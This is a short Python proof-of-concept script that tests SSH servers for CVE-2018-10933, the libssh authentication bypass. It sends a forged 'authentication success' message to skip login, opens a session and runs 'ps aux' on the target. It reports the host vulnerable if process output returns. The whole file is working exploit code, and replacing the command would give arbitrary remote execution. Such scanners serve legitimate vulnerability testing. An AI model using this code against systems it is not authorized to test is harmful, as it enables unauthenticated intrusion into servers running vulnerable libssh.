#!/usr/bin/python
# -*- coding: utf-8 -*-
# @Time       : 2023/4/6 21:15
# @Author     : yunkong
# @FileName   : CVE_2018_10933.py
# @Description: libssh 服务端权限认证绕过漏洞
import logging
import paramiko
import socket


def check_cve_2018_10933(hostname, port):
    sock = socket.socket()
    try:
        sock.connect((hostname, int(port)))

        message = paramiko.message.Message()
        transport = paramiko.transport.Transport(sock)
        transport.start_client()

        message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
        transport._send_message(message)

        client = transport.open_session(timeout=10)
        client.exec_command('ps aux')

        stdout = client.makefile("rb", 2048)
        stderr = client.makefile_stderr("rb", 2048)

        output = stdout.read()
        error = stderr.read()

        stdout.close()
        stderr.close()

        if "USER        PID" in (output + error).decode():
            return True
        else:
            return False

    except:
        return False


def vuln_poc(hostname, port):
    assert 0 < int(port) < 65536, "Invalid port number"
    if check_cve_2018_10933(hostname, port):
        return "CVE-2018-10933 vulnerability exists!"
    else:
        return "CVE-2018-10933 vulnerability does not exist."


# if __name__ == '__main__':
#     print(vuln_poc('192.168.12.130', '2222'))

